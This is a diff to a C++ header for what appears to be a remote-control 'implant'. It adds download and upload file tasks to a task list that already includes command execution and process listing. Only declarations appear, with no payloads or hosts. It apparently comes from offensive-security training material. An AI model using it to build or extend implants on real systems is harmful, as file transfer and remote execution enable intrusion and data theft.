@@ -9,7 +9,6 @@
 #include <string>
 #include <string_view>
 
-#include <boost/uuid/uuid_io.hpp>
 #include <boost/property_tree/ptree.hpp>
 
 // Define implant configuration
@@ -80,10 +79,32 @@ struct ListRunningProcesses {
 	const std::string id;
 };
 
+// DownloadFileTask
+// -------------------------------------------------------------------------------------------
+struct DownloadFileTask {
+	DownloadFileTask(const std::string& id, std::string path);
+	constexpr static std::string_view key{ "download" };
+	[[nodiscard]] Result run() const;
+	const std::string id;
+private:
+	const std::string path;
+};
+
+// UploadFileTask
+// -------------------------------------------------------------------------------------------
+struct UploadFileTask {
+	UploadFileTask(const std::string& id, std::string filename);
+	constexpr static std::string_view key{ "upload" };
+	[[nodiscard]] Result run() const;
+	const std::string id;
+private:
+	const std::string filename;
+};
+
 // ===========================================================================================
 
 // REMEMBER: Any new tasks must be added here too!
-using Task = std::variant<PingTask, ConfigureTask, ExecuteTask, ListThreadsTask, ListRunningProcesses>;
+using Task = std::variant<PingTask, ConfigureTask, ExecuteTask, ListThreadsTask, ListRunningProcesses, DownloadFileTask, UploadFileTask>;
 
 [[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
 	std::function<void(const Configuration&)> setter);
